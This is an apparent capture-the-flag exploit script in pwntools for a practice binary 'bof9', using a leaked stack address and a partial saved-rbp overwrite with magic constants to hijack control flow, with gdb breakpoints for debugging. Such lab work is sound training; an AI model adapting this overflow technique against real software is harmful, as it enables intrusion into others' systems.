script:

```
from pwn import *

p = process('./bof9')
exe = ELF('./bof9')

p.recvuntil(b'Gift for new user: ')
stack_leak = int(p.recvline()[:-1], 16)
log.info('stack leak: ' + hex(stack_leak))

usename_addr = stack_leak - 0x30
fake_rbp_addr = usename_addr + 0x20

gdb.attach(p,gdbscript = '''
b*main+75
b*get_credential+115
c
''')

input()

payload = p64(0x13371337)
payload += p64(0xDEADBEEF)
payload += p64(0xCAFEBABE)
payload += p64(0)
# p64(fake_rbp_addr)[:2] == p16(fake_rbp_addr & 0xffff)
payload += p16(fake_rbp_addr & 0xffff)

p.sendafter(b'Username: ', payload)

# p.sendafter(b'Password: ', b'a'*8)


p.interactive()
```
